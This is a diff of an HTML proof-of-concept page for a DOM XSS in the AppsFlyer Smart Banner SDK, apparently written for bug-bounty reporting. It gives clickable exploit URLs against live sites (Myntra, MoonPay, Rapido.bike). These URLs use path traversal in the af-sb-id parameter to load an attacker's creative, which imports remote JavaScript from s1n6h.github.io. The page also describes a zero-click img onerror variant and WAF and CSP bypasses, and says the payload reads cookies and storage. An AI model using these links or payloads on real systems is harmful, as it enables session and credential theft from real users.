@@ -5,58 +5,53 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>AppsFlyer Smart Banner XSS — URL-Based PoC</title>
 <style>
-*{box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,monospace;max-width:900px;margin:0 auto;padding:20px;background:#0d1117;color:#c9d1d9}h1{color:#f85149;border-bottom:1px solid #30363d;padding-bottom:10px}h2{color:#f0883e;margin-top:30px}.target{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;margin:12px 0}.target h3{color:#7ee787;margin:0 0 8px}.csp{color:#f85149;font-size:13px}.url{background:#0d1117;border:1px solid #30363d;padding:10px;border-radius:6px;word-break:break-all;font-size:12px;color:#79c0ff;margin:8px 0}.url a{color:#79c0ff;text-decoration:none}.url a:hover{text-decoration:underline}code{background:#21262d;padding:2px 6px;border-radius:4px;font-size:12px;color:#f0883e}.badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:bold}.badge-confirmed{background:#1a7f37;color:#fff}.badge-url{background:#da3633;color:#fff}.badge-console{background:#bf8700;color:#000}.step{background:#161b22;padding:8px 12px;border-radius:6px;margin:4px 0;border-left:3px solid #7ee787}
+*{box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,monospace;max-width:900px;margin:0 auto;padding:20px;background:#0d1117;color:#c9d1d9}h1{color:#f85149;border-bottom:1px solid #30363d;padding-bottom:10px}h2{color:#f0883e;margin-top:30px}.target{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;margin:12px 0}.target h3{color:#7ee787;margin:0 0 8px}.csp{color:#f85149;font-size:13px}.url{background:#0d1117;border:1px solid #30363d;padding:10px;border-radius:6px;word-break:break-all;font-size:12px;color:#79c0ff;margin:8px 0}.url a{color:#79c0ff;text-decoration:none}.url a:hover{text-decoration:underline}code{background:#21262d;padding:2px 6px;border-radius:4px;font-size:12px;color:#f0883e}.badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:bold}.badge-confirmed{background:#1a7f37;color:#fff}.badge-url{background:#da3633;color:#fff}.step{background:#161b22;padding:8px 12px;border-radius:6px;margin:4px 0;border-left:3px solid #7ee787}
 </style>
 </head>
 <body>
 
 <h1>AppsFlyer Smart Banner XSS</h1>
 <p><strong>URL-based DOM XSS — open the link, banner auto-renders, tap to fire JS.</strong></p>
-<p>No console, no DevTools. The attack fires from the URL alone.</p>
+<p>No console, no DevTools. Just open the URL in a browser.</p>
 
 <h2>URL-Based Targets (open link = XSS)</h2>
 
 <div class="target">
-<h3>1. MoonPay (Crypto) <span class="badge badge-confirmed">CONFIRMED</span> <span class="badge badge-url">URL-BASED</span></h3>
-<p class="csp">CSP: report-only (not enforced) — javascript: URI executes freely</p>
-<p>AF Key: <code>8f526d7c-6f31-499a-8f25-f9197433ab15</code></p>
-<p>SDK auto-calls <code>showBanner()</code> on page load → banner renders automatically</p>
-<div class="url"><a href="https://discover.moonpay.com/?af-sb-id=../../e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad">https://discover.moonpay.com/?af-sb-id=../../e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad</a></div>
-<div class="step">1. Open the URL in any browser</div>
-<div class="step">2. Purple "CLICK HERE" banner auto-renders at top of page</div>
-<div class="step">3. Tap "CLICK HERE" → <code>alert(origin)</code> fires: <code>https://discover.moonpay.com</code></div>
+<h3>1. Myntra (Fashion e-commerce, India's #1) <span class="badge badge-confirmed">CONFIRMED</span> <span class="badge badge-url">URL-BASED</span></h3>
+<p class="csp">CSP: NONE — maximum exposure, zero-click also works</p>
+<p>AF Key: <code>9fcc278f-1bfe-4959-9ef8-8e8e77ff894d</code></p>
+<p>SDK auto-calls <code>showBanner()</code> → banner renders automatically. No WAF, no CSP.</p>
+<div class="url"><a href="https://www.myntra.com/?af-sb-id=../../e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad">https://www.myntra.com/?af-sb-id=../../e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad</a></div>
+<div class="step">1. Open the URL in a browser (use mobile UA for best results)</div>
+<div class="step">2. Purple "CLICK HERE" banner auto-renders at top</div>
+<div class="step">3. Tap "CLICK HERE" → XSS fires on <code>https://www.myntra.com</code></div>
 </div>
 
 <div class="target">
-<h3>2. Rapido.bike (Ride-hailing) <span class="badge badge-confirmed">CONFIRMED</span> <span class="badge badge-url">URL-BASED</span></h3>
-<p class="csp">CSP: unsafe-inline + https: (no hashes) — javascript: URI executes freely</p>
+<h3>2. MoonPay (Crypto) <span class="badge badge-confirmed">CONFIRMED</span> <span class="badge badge-url">URL-BASED</span></h3>
+<p class="csp">CSP: report-only (not enforced)</p>
+<p>AF Key: <code>8f526d7c-6f31-499a-8f25-f9197433ab15</code></p>
+<div class="url"><a href="https://discover.moonpay.com/?af-sb-id=../../e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad">https://discover.moonpay.com/?af-sb-id=../../e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad</a></div>
+<div class="step">1. Open the URL → banner auto-renders → tap "CLICK HERE" → XSS fires</div>
+</div>
+
+<div class="target">
+<h3>3. Rapido.bike (Ride-hailing, India's #1) <span class="badge badge-confirmed">CONFIRMED</span> <span class="badge badge-url">URL-BASED</span></h3>
+<p class="csp">CSP: unsafe-inline + https: (no hashes)</p>
 <p>AF Key: <code>ac0b6bf2-d76d-403f-9819-fbfc4b43a227</code></p>
-<p>SDK auto-calls <code>showBanner()</code> on page load → banner renders automatically</p>
 <div class="url"><a href="https://www.rapido.bike/?af-sb-id=../../e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad">https://www.rapido.bike/?af-sb-id=../../e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad</a></div>
-<div class="step">1. Open the URL in any browser</div>
-<div class="step">2. Purple "CLICK HERE" banner auto-renders at top of page</div>
-<div class="step">3. Tap "CLICK HERE" → <code>alert(origin)</code> fires: <code>https://www.rapido.bike</code></div>
+<div class="step">1. Open the URL → banner auto-renders → tap "CLICK HERE" → XSS fires</div>
 </div>
 
 <h2>How It Works</h2>
 <ol>
-<li><strong>Path traversal:</strong> <code>af-sb-id</code> has no validation. <code>../../</code> traverses to attacker's AppsFlyer workspace key + creative.</li>
-<li><strong>Auto-render:</strong> SDK calls <code>AF('banners','showBanner')</code> on page load → reads <code>af-sb-id</code> → fetches attacker's creative → injects via <code>innerHTML</code> (no sanitization).</li>
-<li><strong>HTML entity bypass:</strong> Creative layout uses <code>java&#x73;cript:import('//s1n6h.github.io/x.js')</code> — <code>&#x73;</code> decodes to <code>s</code> in DOM → live <code>javascript:</code> URI survives.</li>
-<li><strong>One tap → JS:</strong> <code>&lt;a&gt;</code> covers full banner area. One tap fires <code>javascript:import()</code> → loads and executes <code>x.js</code> on victim's origin.</li>
+<li><strong>Path traversal:</strong> <code>af-sb-id</code> has no validation. <code>../../</code> traverses to attacker's AppsFlyer workspace.</li>
+<li><strong>Auto-render:</strong> SDK calls <code>AF('banners','showBanner')</code> on page load → fetches attacker's creative → injects via <code>innerHTML</code>.</li>
+<li><strong>XSS fires:</strong> Creative layout contains <code>&lt;a href="javascript:import('//s1n6h.github.io/x.js')"&gt;</code> covering full banner area. One tap fires JS on victim origin.</li>
+<li><strong>Zero-click variant:</strong> If creative uses <code>&lt;img src=x onerror="import(...)"&gt;</code> instead, XSS fires on page load with no interaction. Verified on MoonPay (no CSP enforcement).</li>
 </ol>
 
-<h2>Zero-Click (Verified)</h2>
-<p>If the attacker updates their creative to use <code>&lt;img src=x onerror="import('//s1n6h.github.io/x.js')"&gt;</code> instead of <code>&lt;a href&gt;</code>, the XSS fires on page load with zero interaction. Verified on MoonPay: <code>&lt;img onerror&gt;</code> fires automatically via <code>innerHTML</code> — no tap needed. The <code>innerHTML</code> sink allows both approaches.</p>
-
-<h2>Other Targets (Console-Based)</h2>
-<p>These also use the AF Smart Banner SDK but require console injection (not URL-based):</p>
-<ul>
-<li><strong>wolt.com</strong> — SDK loads but <code>showBanner()</code> is never called. WAF: CloudFront blocks <code>../</code>, bypassed with <code>..%5c</code>. CSP: strict-dynamic bypassed via <code>createElement('script')</code>.</li>
-<li><strong>uat-bugbounty.nonprod.syfe.com</strong> — SDK script blocked by CSP (<code>websdk.appsflyer.com</code> not in allowlist). CSP bypassed via <code>createElement('script')</code>. WAF: backslash bypass.</li>
-</ul>
-
-<h2>Payload</h2>
+<h2>Payload: x.js</h2>
 <p>Hosted at: <a href="https://s1n6h.github.io/x.js">https://s1n6h.github.io/x.js</a></p>
 <p>Shows: origin, cookies, localStorage, sessionStorage. In a real attack: wallet drain, session theft, credential exfiltration.</p>
 
@@ -64,8 +59,8 @@
 <ol>
 <li>No validation on <code>af-sb-id</code> before URL construction</li>
 <li>No HTML sanitization in <code>_createElement()</code> — raw <code>innerHTML</code> sink</li>
-<li>No filtering of <code>javascript:</code> URIs, <code>onerror</code>/<code>onload</code> handlers in creative layouts</li>
-<li>Creative script field injected via <code>createElement('script')</code> — bypasses CSP strict-dynamic</li>
+<li>No filtering of <code>javascript:</code> URIs or <code>onerror</code>/<code>onload</code> handlers</li>
+<li>Creative script field injected via <code>createElement('script')</code> — bypasses CSP</li>
 </ol>
 
 </body>
